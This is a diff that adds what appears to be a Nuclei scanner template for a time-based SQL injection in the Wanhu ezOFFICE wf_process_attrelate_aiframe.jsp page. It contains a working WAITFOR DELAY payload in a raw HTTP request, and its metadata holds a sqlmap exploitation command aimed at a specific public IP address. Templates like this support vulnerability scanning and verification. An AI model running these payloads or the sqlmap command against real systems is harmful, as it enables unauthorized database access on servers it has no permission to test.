@@ -1,0 +1,39 @@
+id: wanhu-ezoffice-wf_process_attrelate_aiframe-sqli
+
+info:
+  name: 万户 ezoffice wf_process_attrelate_aiframe.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: 
+    sqlmap: sqlmap -u "http://8.142.133.144:7001/defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1" -p fieldId --batch --dbms=mssql --risk 3 --level 5 --technique=T
+  tags: wanhu,oa,sqli,time,ezoffice
+
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/work_flow/process/wf_process_attrelate_aiframe.jsp;?fieldId=1%20WAITFOR%20DELAY%20%270:0:6%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_1,'defaultroot')
+          - status_code_1 == 200 && status_code_2 == 200
+          - duration_2 >= 5 && duration_2 < 9
+        condition: and
